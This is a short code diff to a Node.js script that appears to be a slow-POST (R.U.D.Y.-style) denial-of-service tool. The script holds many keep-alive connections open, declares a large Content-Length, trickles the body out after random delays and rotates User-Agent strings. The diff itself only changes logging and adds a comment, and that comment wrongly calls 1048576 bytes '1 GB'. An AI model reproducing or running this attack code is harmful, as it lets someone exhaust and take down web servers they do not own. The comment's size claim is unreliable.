@@ -11,6 +11,7 @@ const connections = 125
 function setupStream() {
   stream._read = () => {
     setTimeout(() => {
+      console.log('Sending 1B of data')
       stream.push('payload.txt')
     }, (Math.random() * 10 + 1) * 1000)
   }
@@ -21,7 +22,7 @@ const options = {
   uri: host,
   headers: {
     'Connection': 'keep-alive',
-    'Content-Length': '1048576',
+    'Content-Length': '1048576', //1 GB of data
     'User-Agent': useragent.getRandom()
   },
   formData: {
@@ -42,7 +43,6 @@ function rudyAttack() {
 function attack() {
   rp(options)
   .then(() => {
-    console.log('Request initiated')
     closeStream()
   })
   .catch(err => {
